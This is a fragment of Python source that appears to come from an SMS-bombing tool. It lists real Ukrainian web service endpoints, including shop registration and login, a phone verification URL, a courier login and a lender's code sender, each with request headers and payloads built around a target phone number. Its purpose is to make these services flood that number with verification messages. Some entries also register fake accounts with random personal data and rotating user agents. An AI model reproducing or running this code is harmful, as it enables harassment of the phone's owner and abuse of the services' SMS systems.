                                       'x-csrf-token': 'vAEiHe4J0EpcNpr-zytnFIC3Ry5OQeGkPwZJ0WT0U_vyTHVCpTi2Pipv7rS-RR9E4eV1Ywp3pNJmNR29EIwYtw==',
                                       'x-requested-with': 'XMLHttpRequest'},
                "data": {
                            '_csrf': 'aRyHRsClYE_6VhuvWCId23uQuqV7c-xaF6b9fNMz7LonUdAZi5QGO4wPb-UpTGWLGsKI6D9FqSxOlakQp0un9g==',
                            'phone': format_phone(number, "+### ## ### ## ##")}

            },
            {
                "url": "https://chereviki.com.ua/register",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {'newsletter': '1', 'guest': '0', 'lastname': name, 'firstname': surname,
                         'telephone': format_phone(number, "+## (###) ###-##-##"),
                         'email': email, 'password': password, 'confirm': password,
                         'birthday': f'{randint(10, 29)}-{randint(10, 29)}-{randint(1995, 2004)}'}
            },
            {
                "url": "https://chereviki.com.ua/login",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {'type_auth': 'auth_sms',
                         'sms[telephone]': format_phone(number, "+## (###) ###-##-##"),
                         'sms[password]': '',
                         'pass[telephone]': '+38 (0__) ___-__-__',
                         'pass[password]': password}
            },
            {
                "url": f"https://vencon.ua/ua/user/profile/send-phone-verify-code?key=0&phone={format_phone(number, '+###(##)-###-##-##')}&duplicate=false",
                "send": "get",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent(), 'x-requested-with':'XMLHttpRequest'},
                "data": ""
            },
            {
                "url": f"https://24.meest.com/api/v1/login?lang=uk",
                "send": "post",
                "spam_type": "data",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "login": number,
                    "clientID": "GA1.1.199843362.1730598411"
                }
            },
            {
                "url": f"https://api.creditkasa.ua/public/auth/sendAcceptanceCode",
                "send": "post",
                "spam_type": "json",
                "headers": {'User-Agent': get_agent()},
                "data": {
                    "mobilePhone": number,
                    "productGroup": "INSTALLMENT",
                    "brandName": "NaVse"
                }
            }
        ]
    }

    return services[f"services_{spam_type}"]


def get_count_of_services(spam_type: str) -> int:
    return len(get_services('380000000000', spam_type))